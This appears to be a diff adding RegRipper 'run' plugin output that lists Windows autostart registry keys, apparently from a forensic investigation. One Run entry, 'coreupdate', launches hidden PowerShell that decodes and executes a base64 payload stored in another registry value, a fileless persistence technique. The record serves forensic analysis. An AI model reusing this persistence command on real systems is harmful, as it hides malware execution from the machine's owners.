@@ -1,0 +1,44 @@
+$ rip -r SOFTWARE -p run
+
+run v.20200511
+(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive
+
+Microsoft\Windows\CurrentVersion\Run
+LastWrite Time 2020-09-19 03:30:01Z
+  VMware VM3DService Process - "C:\Windows\system32\vm3dservice.exe" -u
+  coreupdate - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\9sEoCawv').GetValue('45SVAG2o'))))""
+  VMware User Process - "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+
+Microsoft\Windows\CurrentVersion\Run has no subkeys.
+
+Microsoft\Windows\CurrentVersion\RunOnce
+LastWrite Time 2020-09-18 22:28:18Z
+Microsoft\Windows\CurrentVersion\RunOnce has no values.
+Microsoft\Windows\CurrentVersion\RunOnce has no subkeys.
+
+Microsoft\Windows\CurrentVersion\RunServices not found.
+
+Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+LastWrite Time 2020-09-17 17:56:13Z
+Wow6432Node\Microsoft\Windows\CurrentVersion\Run has no values.
+Wow6432Node\Microsoft\Windows\CurrentVersion\Run has no subkeys.
+
+Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+LastWrite Time 2020-09-17 17:56:13Z
+Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce has no values.
+Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce has no subkeys.
+
+Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run not found.
+
+Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run not found.
+
+Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce not found.
+
+Microsoft\Windows\CurrentVersion\StartupApproved\Run not found.
+
+Microsoft\Windows\CurrentVersion\StartupApproved\Run32 not found.
+
+Microsoft\Windows\CurrentVersion\StartupApproved\StartupFolder not found.
+
